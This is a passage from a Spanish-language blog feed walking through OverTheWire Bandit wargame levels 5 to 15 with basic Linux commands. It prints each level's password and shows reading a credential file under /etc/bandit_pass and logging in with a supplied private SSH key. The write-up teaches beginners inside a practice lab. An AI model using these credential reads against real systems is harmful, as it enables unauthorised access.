+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;ul&gt;
+  &lt;li&gt;Especificamos varios filtros &lt;em&gt;-readable&lt;/em&gt; para ver archivos legibles por humanos&lt;/li&gt;
+  &lt;li&gt;&lt;em&gt;find&lt;/em&gt; posee la bandera &lt;em&gt;-execuatable&lt;/em&gt; para buscar archivs con permisos de ejecucion&lt;/li&gt;
+  &lt;li&gt;size &lt;em&gt;1033c&lt;/em&gt; nos permite buscar archivos de 1033 bytes (usando la opción c)&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bandit5@bandit:~/inhere&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;find &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-readable&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-executable&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-size&lt;/span&gt; 1033c | xargs &lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; | xargs
+DXjZPULLxYr17uwoI01bNLQbtFemEgo7
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;hr /&gt;
+&lt;hr /&gt;
+&lt;hr /&gt;
+
+&lt;h1 id=&quot;bandit-6--7&quot;&gt;bandit 6 –&amp;gt; 7&lt;/h1&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;The password for the next level is stored somewhere on the server and has all of the following properties:&lt;/p&gt;
+
+  &lt;ul&gt;
+    &lt;li&gt;owned by user bandit7&lt;/li&gt;
+    &lt;li&gt;owned by group bandit6&lt;/li&gt;
+    &lt;li&gt;33 bytes in size&lt;/li&gt;
+  &lt;/ul&gt;
+&lt;/blockquote&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Hacemos uso nuevamente del manual de &lt;em&gt;find&lt;/em&gt; para poder buscar las banderas indicadas&lt;/li&gt;
+  &lt;li&gt;&lt;em&gt;-user bandi7&lt;/em&gt; filtra por archivos de propiedad de &lt;em&gt;bandit7&lt;/em&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;em&gt;-group bandit6&lt;/em&gt; filtra por propiedad del &lt;em&gt;grupo bandit6&lt;/em&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;em&gt;-zise 33c&lt;/em&gt; filtra por archivo de 33bytes&lt;/li&gt;
+  &lt;li&gt;El STDERR es identificado con el número 2, y sus mensajes pueden ser redirigidos (usando el símbolo &amp;gt;) a /dev/null (archivo especial utilizado para descartar información):&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bandit6@bandit:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;find / &lt;span class=&quot;nt&quot;&gt;-user&lt;/span&gt; bandit7 &lt;span class=&quot;nt&quot;&gt;-group&lt;/span&gt; bandit6 &lt;span class=&quot;nt&quot;&gt;-size&lt;/span&gt; 33c 2&amp;gt;/dev/null | xargs &lt;span class=&quot;nb&quot;&gt;cat
+&lt;/span&gt;HKBPTKQnIay4Fw76bEy8PVxKEDQRKTzs
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h1 id=&quot;bandit-7--8&quot;&gt;bandit 7 –&amp;gt; 8&lt;/h1&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;The password for the next level is stored in the file data.txt next to the word millionth&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;usamos el comando &lt;em&gt;cat data.txt&lt;/em&gt; pero al ver el contendio de &lt;em&gt;data.txt&lt;/em&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bandit7@bandit:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;data.txt 
+canonization&lt;span class=&quot;s1&quot;&gt;'s  7ITrZvFVzsjujBHVlu4gfcHbW1gWQUcN
+reserve AHO3PedgUR05aCaQVGVFQRgY2oR1SBYh
+Zanuck  30KRlOQjnCq5DyqNZePHAD6tCZbVjT1f
+baritone        XSodKcCZa05ckkLyP4uXwrjIVaCzKcpq
+lineman'&lt;/span&gt;s       Gh8HTLmWxnXJxZF4DzhuiRpV8xejb6yw
+aquas   RkI4EWYAjHPMexRFTY9Rq7vQtjhiKgZw
+swaddled        snDpr6ve7nuPsjBoTGLrmpOYomdhVzAH
+garishness&lt;span class=&quot;s1&quot;&gt;'s    UbK1yZ2nC02GEjArlASLw0bT8jgOp9rx
+Benny'&lt;/span&gt;s QQkZrdiFs47KckVLi5ifsFqtLcRxyjvZ
+regulated       sxJ8HT73fvZMMIicL50nhawcrsYGUiWP
+knotting        vh268WJXw1OSnszed9MVaHD4rTP69lZr
+hymnals 7MqsN32lfDbPigtAX6cwFbMZcPAMUoae
+Fremont tCy02wC8xdpFqjlZ8xdBQYAHFZPHk7ls
+punter&lt;span class=&quot;s1&quot;&gt;'s        zAfzaA1IOuBSamCR6eMmRoc9oNXPQ16a
+junking 6Tlr5K8YZ1d2Xsdku3TTFYXWB6WOMXyT
+Aymara  zSeUS0UyD8Q6a6YPwaClRBbk1x8kFBEc
+waned   gL59r6xvewh5y8t0mgiNtHtCUMG8S6Id
+conceded        TWLUptX3HbwD4qsYOQ9sENOnOiNy79sC
+kilned  kLjrgoJvftIyUyotuOI4cxFcxQXbC6aS
+Santayana       KKn1I4fuWdzKyvffp1aYrBDzQa3Tr3Pk
+Antigua dRyNieqAg0OkCgrKVQFXMXS06vFArL55
+heyday  UAGwMlFzylGa4fHpQZEelUQEZ5JlUpyX
+praiseworthiness'&lt;/span&gt;s      bjRB0uGXM4dH7ip9hHB3mbFBMMwlNKNq
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;tiene demasiadas lineas para buscar manualmente&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;table&gt;
+      &lt;tbody&gt;
+        &lt;tr&gt;
+          &lt;td&gt;usamos _cat data.txt&lt;/td&gt;
+          &lt;td&gt;wc_ para ver el total de lineas de texto que contien el archivo&lt;/td&gt;
+        &lt;/tr&gt;
+      &lt;/tbody&gt;
+    &lt;/table&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bandit7@bandit:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;data.txt | &lt;span class=&quot;nb&quot;&gt;wc
+  &lt;/span&gt;98567  197133 4184396
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Como ya se mensiono anteriormente, buscar linea a linea la que contenga la palabra millionth seria bastante engorroso, para omitir eso, usaremos grep junto 
+con una bandera&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Usando &lt;em&gt;grep&lt;/em&gt; podemos filtrar por la palabra &lt;em&gt;millionth&lt;/em&gt; usando la bandera &lt;em&gt;-i&lt;/em&gt; para que no distinga entre mayusculas y minusculas&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bandit7@bandit:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;data.txt | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; millionth
+millionth       cvX2JJa4CFALtqS87jk27qwqGhBM9plV
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;hr /&gt;
+&lt;hr /&gt;
+&lt;hr /&gt;
+
+&lt;h1 id=&quot;bandit-8--9&quot;&gt;bandit 8 –&amp;gt; 9&lt;/h1&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;The password for the next level is stored in the file data.txt and is the only line of text that occurs only once&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;p&gt;Usamos el comando &lt;em&gt;sort&lt;/em&gt; para ordenar el input en orden alfabetico&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Usamos el &lt;em&gt;uniq -u&lt;/em&gt; para mostrar solo las lineas que no estan repetidas&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bandit8@bandit:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;data.txt | &lt;span class=&quot;nb&quot;&gt;sort&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;uniq&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt;
+UsvVyFSfZZWbi6wgC7dAFyFuR6jQQUhR
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;hr /&gt;
+&lt;hr /&gt;
+&lt;hr /&gt;
+
+&lt;h1 id=&quot;bandi-9--10&quot;&gt;bandi 9 –&amp;gt; 10&lt;/h1&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;The password for the next level is stored in the file data.txt in one of the few human-readable strings, preceded by several ‘=’ characters.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Usamos el comando &lt;em&gt;strings cat&lt;/em&gt; para ver los caracteres legibles por humanos&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bandit9@bandit:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;strings data.txt
+Z/,_
+WW&lt;span class=&quot;s2&quot;&gt;&quot;&amp;amp;8
+2Qk)
+xWa_
+x?Xn
+//M&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;
+;yzEt!
+WpU~e
+&lt;/span&gt;&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;Rn,I
+VSXdK
+WB|&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+GhG&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;==========&lt;/span&gt; the&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;2i&lt;span class=&quot;s2&quot;&gt;&quot;4
+DUJmU
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;ahora vamos a filtrar con &lt;em&gt;grep ‘=’&lt;/em&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;andit9@bandit:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;strings data.txt | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'='&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;==========&lt;/span&gt; the&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;2i&lt;span class=&quot;s2&quot;&gt;&quot;4
+=:G e
+========== password
+&amp;lt;I=zsGi
+Z)========== is
+A=|t&amp;amp;E
+Zdb=
+c^ LAh=3G
+*SF=s
+&amp;amp;========== truKLdjsbJ5g7yyJ2X2R0o3a5HQJFuLk
+S=A.H&amp;amp;^
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;con el comando &lt;em&gt;tail -n 2&lt;/em&gt;, tomamos las 2 ultimas lineas del output anterior&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bandit9@bandit:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;strings data.txt | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'='&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;tail&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; 2
+&amp;amp;&lt;span class=&quot;o&quot;&gt;==========&lt;/span&gt; truKLdjsbJ5g7yyJ2X2R0o3a5HQJFuLk
+&lt;span class=&quot;nv&quot;&gt;S&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;A.H&amp;amp;^
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;el comando &lt;em&gt;head -n 1&lt;/em&gt; nos toma la primer liena del output anterior&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bandit9@bandit:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;strings data.txt | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'='&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;tail&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; 2 | &lt;span class=&quot;nb&quot;&gt;head&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; 1
+&amp;amp;&lt;span class=&quot;o&quot;&gt;==========&lt;/span&gt; truKLdjsbJ5g7yyJ2X2R0o3a5HQJFuLk
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Finalmente, agregamos el filtro &lt;em&gt;awk ‘{print $2}’&lt;/em&gt; para filtrar el output anterior y solo tomamos la 2 cadena de texto&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bandit9@bandit:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;strings data.txt | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'='&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;tail&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; 2 | &lt;span class=&quot;nb&quot;&gt;head&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; 1 | &lt;span class=&quot;nb&quot;&gt;awk&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'{print $2}'&lt;/span&gt;
+truKLdjsbJ5g7yyJ2X2R0o3a5HQJFuLk
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;hr /&gt;
+&lt;hr /&gt;
+&lt;hr /&gt;
+
+&lt;h1 id=&quot;bandit-10--11&quot;&gt;bandit 10 –&amp;gt; 11&lt;/h1&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;The password for the next level is stored in the file data.txt, which contains base64 encoded data&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Comprovamos lo mencionado anteriormente, esta codificado en base64&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bandit10@bandit:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;data.txt
+&lt;span class=&quot;nv&quot;&gt;VGhlIHBhc3N3b3JkIGlzIElGdWt3S0dzRlc4TU9xM0lSRnFyeEUxaHhUTkViVVBSCg&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;usamos &lt;em&gt;base64 -d&lt;/em&gt; para decodificarlo, y obtenemos la flag&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bandit10@bandit:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;data.txt | &lt;span class=&quot;nb&quot;&gt;base64&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt;
+The password is IFukwKGsFW8MOq3IRFqrxE1hxTNEbUPR
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;hr /&gt;
+&lt;hr /&gt;
+&lt;hr /&gt;
+
+&lt;h1 id=&quot;bandit-11--12&quot;&gt;bandit 11 –&amp;gt; 12&lt;/h1&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;The password for the next level is stored in the file data.txt, where all lowercase (a-z) and uppercase (A-Z) letters have been rotated by 13 positions&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;La guia de bandit nos dice que esta &lt;em&gt;cifrado en Cesar&lt;/em&gt;, la diferencia es que esta modido 13 posiciones&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bandit11@bandit:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;data.txt
+Gur cnffjbeq vf 5Gr8L4qetPEsPk8htqjhRK8XSP6x2RHh
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Usamos &lt;a href=&quot;https://cryptii.com/pipes/caesar-cipher&quot;&gt;decrypt cesar 13 positions&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;The password is 5Te8Y4drgCRfCx8ugdwuEX8KFC6k2EUu
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;hr /&gt;
+&lt;hr /&gt;
+&lt;hr /&gt;
+
+&lt;h1 id=&quot;bandit-12--13&quot;&gt;bandit 12 –&amp;gt; 13&lt;/h1&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;The password for the next level is stored in the file data.txt, which is a hexdump of a file that has been repeatedly compressed. For this level it may be useful to create a directory under /tmp in which you can work using mkdir. For example: mkdir /tmp/myname123. Then copy the datafile using cp, and rename it using mv (read the manpages!)&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Antes de trabajar con el archivo, movemos el .rar en la ruta indicada&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bandit12@bandit:/tmp/myname123&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls
+&lt;/span&gt;data2.txt.bz2
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Para pasar el hexdump a un archivo normal, usamos el comando &lt;em&gt;xxd&lt;/em&gt;. Este tiene la opción &lt;em&gt;-r&lt;/em&gt;, que permite convertir un hexdump a un binario:&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bandit12@bandit:/tmp/myname123&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls
+&lt;/span&gt;data  data2.txt
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;La idea de este reto es aprender a descomprimir diferentes tipos de archivos, pero
+se puede solucionar usando los siguientes comandos:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;em&gt;zcat&lt;/em&gt; descomprime una lista de archivos (.gz) en la línea de comando o su &lt;em&gt;standard input&lt;/em&gt; y escribe los datos sin comprimir en el standard &lt;em&gt;output&lt;/em&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;em&gt;bzcat&lt;/em&gt; es similar que zcat (descomprime todos los archivos indicados y lo envía &lt;em&gt;standard output&lt;/em&gt;), pero de archivos &lt;em&gt;.bz2&lt;/em&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;em&gt;tar xO&lt;/em&gt;, donde &lt;em&gt;x&lt;/em&gt; es para extraer, y &lt;em&gt;O&lt;/em&gt; es para extraer el archivo a un &lt;em&gt;standard output&lt;/em&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;em&gt;file -&lt;/em&gt; permite ver el formato del archivo descomprimido, donde el nombre de este es reemplazado por el símbolo &lt;em&gt;-&lt;/em&gt;
+    &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bandit12@bandit:/tmp/myname123&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;zcat data | bzcat | zcat | &lt;span class=&quot;nb&quot;&gt;tar &lt;/span&gt;xO | &lt;span class=&quot;nb&quot;&gt;tar &lt;/span&gt;xO | bzcat | &lt;span class=&quot;nb&quot;&gt;tar &lt;/span&gt;xO | zcat | &lt;span class=&quot;nb&quot;&gt;cat
+&lt;/span&gt;The password is 8ZjyCRiBWFYkneahHwxCv3wb2a1ORpYL
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;</content><author><name>Deiby Espinosa</name><email>deibysp39@gmail.com</email></author><category term="Bash" /><category term="Bandit" /><category term="bash" /><category term="scripting" /><summary type="html">El mejor metodo de aprendizaje es practicando</summary></entry><entry><title type="html">Bandit0: Bash para principiantes - 2da parte</title><link href="http://localhost:4000/second-bandit0/" rel="alternate" type="text/html" title="Bandit0: Bash para principiantes - 2da parte" /><published>2021-10-16T00:00:00-05:00</published><updated>2021-10-16T00:00:00-05:00</updated><id>http://localhost:4000/second-bandit0</id><content type="html" xml:base="http://localhost:4000/second-bandit0/">&lt;p&gt;Continuando con la maquina &lt;a href=&quot;https://overthewire.org/wargames/bandit/bandit14.html&quot;&gt;bandit 13 –&amp;gt; 14&lt;/a&gt;&lt;/p&gt;
+
+&lt;hr /&gt;
+&lt;hr /&gt;
+&lt;hr /&gt;
+
+&lt;h1 id=&quot;bandit-13--14&quot;&gt;bandit 13 –&amp;gt; 14&lt;/h1&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;The password for the next level is stored in /etc/bandit_pass/bandit14 and can only be read by user bandit14. For this level, you don’t get the next password, but you get a private SSH key that can be used to log into the next level. Note: localhost is a hostname that refers to the machine you are working on&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Obtenemos la llave privada para conectarnos por &lt;em&gt;ssh&lt;/em&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bandit13@bandit:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls
+&lt;/span&gt;sshkey.private
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Usamos la sshkey para conectarnos mediante &lt;em&gt;SSH&lt;/em&gt; al usuario &lt;em&gt;bandit14&lt;/em&gt; para buscar la flag&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bandit13@bandit:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ssh &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; sshkey.private bandit14@localhost
+
+bandit14@bandit:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;whoami
+&lt;/span&gt;bandit14
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Le hacemos un &lt;em&gt;cat&lt;/em&gt; a la ruta que nos indica la maquina para obtener la contraseña
+    &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bandit14@bandit:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /etc/bandit_pass/bandit14
+4wcYUJFw0k0XLShlDzztnTBHiqxU3b3e
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;hr /&gt;
+&lt;hr /&gt;
+&lt;hr /&gt;
+
+&lt;h1 id=&quot;bandit-14--15&quot;&gt;bandit 14 –&amp;gt; 15&lt;/h1&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;The password for the next level can be retrieved by submitting the password of the current level to port 30000 on localhost.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Validamos la contraseña del nivel actual.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bandit14@bandit:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /etc/bandit_pass/bandit14
+4wcYUJFw0k0XLShlDzztnTBHiqxU3b3e
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Al enviar la contraseña por el puerto 30000 como se nos indiga, obtenemos la &lt;em&gt;password&lt;/em&gt; para el siguiente nivel&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bandit14@bandit:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'4wcYUJFw0k0XLShlDzztnTBHiqxU3b3e'&lt;/span&gt; | nc localhost 30000
+Correct!
+BfMYroe26WYalil77FoDi9qh59eK5xNr
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;hr /&gt;
+&lt;hr /&gt;
+&lt;hr /&gt;
+
+&lt;h1 id=&quot;bandit-15--16&quot;&gt;bandit 15 –&amp;gt; 16&lt;/h1&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;The password for the next level can be retrieved by submitting the password of the current level to port 30001 on localhost using SSL encryption.
+Helpful note: Getting “HEARTBEATING” and “Read R BLOCK”? Use -ign_eof and read the “CONNECTED COMMANDS” section in the manpage. Next to ‘R’ and ‘Q’, the ‘B’ command also works in this version of that command…&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Usamos &lt;em&gt;openSSL&lt;/em&gt; para cifrar la comunicación&lt;/li&gt;
